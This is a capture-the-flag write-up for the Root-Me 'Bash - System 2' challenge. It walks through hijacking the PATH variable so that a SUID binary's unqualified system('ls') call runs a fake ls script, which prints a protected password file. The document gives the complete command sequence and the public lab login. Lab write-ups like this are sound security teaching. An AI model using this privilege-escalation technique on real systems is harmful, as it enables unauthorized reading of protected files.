### Challenge Documentation: Bash - System 2

**Category:** Root-Me / App-Script  

**Link:** [Bash - System 2](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)

#### **Objective**
The goal of this challenge is to exploit a vulnerable SUID binary to access the hidden password file located at `/challenge/app-script/ch12/.passwd`.

### **1. Initial Setup**

The challenge provides SSH credentials to access the remote server:
- **Host**: `challenge02.root-me.org`  
- **Port**: `2222`  
- **Username**: `app-script-ch12`  
- **Password**: `app-script-ch12`  

##### **Connection Command**:
```bash
ssh -p 2222 app-script-ch12@challenge02.root-me.org
```

### **2. File Analysis**

Upon logging in, analyze the challenge directory to identify the files:
```bash
ls -l /challenge/app-script/ch12/
```

**Output:**
```
total 16
-r-sr-x--- 1 app-script-ch12-cracked app-script-ch12 7252 Dec 10  2021 ch12
-r--r----- 1 app-script-ch12-cracked app-script-ch12  187 Dec 10  2021 ch12.c
```

### **3. Understanding the Vulnerability**

The provided `ch12.c` source code contains the following:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
 
int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

#### **Analysis**:
- The `setreuid(geteuid(), geteuid());` call allows the program to execute with **elevated privileges** due to the SUID bit.
- The `system()` function executes the `ls` command without specifying the full path.
- This creates a **command injection opportunity** by hijacking the `ls` command using the `PATH` environment variable.

### **4. Exploitation Steps**

The goal is to replace the `ls` command with a malicious script that uses `cat` to print the contents of `.passwd`.

#### **Step 1: Create a Fake `ls` Script**

Create a directory in `/tmp` to store the malicious `ls` script:
```bash
mkdir /tmp/get-flag
```

**Note**: If the directory already exists, you should change the name `get-flag` to avoid conflicts.

Create the fake `ls` script that uses `cat` to display the `.passwd` file:
```bash
echo '/bin/cat /challenge/app-script/ch12/.passwd' > /tmp/get-flag/ls
```

Make the script executable:
```bash
chmod +x /tmp/get-flag/ls
```

#### **Step 2: Modify the `PATH` Environment Variable**

Prepend the directory containing the fake `ls` script to the `PATH` variable:
```bash
export PATH=/tmp/get-flag:$PATH
```

This ensures that the `system("ls ...")` call in the binary executes **our fake `ls` script** instead of the system's `ls`.

#### **Step 3: Run the SUID Binary**

Execute the `ch12` binary:
```bash
./ch12
```

### **5. Output**

The binary runs our fake `ls` script, which uses `cat` to print the contents of the `.passwd` file. The output reveals the challenge flag:
```
***************************
```

### **6. Summary of Commands**

Here is the complete set of commands used to solve the challenge:
```bash
ssh -p 2222 app-script-ch12@challenge02.root-me.org

# Create the fake 'ls' script
mkdir /tmp/get-flag
echo '/bin/cat /challenge/app-script/ch12/.passwd' > /tmp/get-flag/ls
chmod +x /tmp/get-flag/ls

# Modify the PATH variable
export PATH=/tmp/get-flag:$PATH

# Run the SUID binary
./ch12
```

### **7. Conclusion**

By exploiting the insecure use of `system()` and manipulating the `PATH` environment variable, we hijacked the `ls` command to execute our custom script. This allowed us to display the hidden password file's contents.
